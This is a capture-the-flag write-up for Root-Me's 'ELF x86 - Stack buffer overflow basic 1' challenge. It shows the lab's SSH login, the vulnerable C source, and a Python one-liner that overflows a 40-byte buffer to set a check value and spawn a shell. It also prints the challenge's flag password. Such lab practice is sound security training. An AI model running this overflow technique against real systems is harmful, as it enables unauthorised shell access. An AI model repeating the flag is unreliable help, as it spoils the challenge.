# ELF x86 - Stack buffer overflow basic 1
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1
```
Environment configuration :

PIE 	        Position Independent Executable 	 No 
RelRO 	        Read Only relocations 	                 No 
NX 	        Non-Executable Stack 	                 No 
Heap exec 	Non-Executable Heap 	                 No 
ASLR 	        Address Space Layout Randomization 	 No 
SF 	        Source Fortification 	                 No 
SRC 	        Source code access 	                 Yes 

Challenge connection informations :

Host	challenge02.root-me.org
Protocol	SSH
Port	2222
SSH access 	ssh -p 2222 app-systeme-ch13@challenge02.root-me.org     WebSSH
Username	app-systeme-ch13
Password	app-systeme-ch13
```
The source code is:
```c
#include <stdlib.h>
#include <stdio.h>

/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/


int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

As you may notice, there is no boundary check. In addition, every time the execuable runs, it will print the _check_'s value - which should be 0xdeadbeef.<br>
There's not a lot to analyze. A quick way would be just to try, until _check_ gets overwritten, and then replace its value.
After few tries:
```sh
app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
whoami
app-systeme-ch13-cracked
cat .passwd
1w4ntm0r3pr0np1s
```
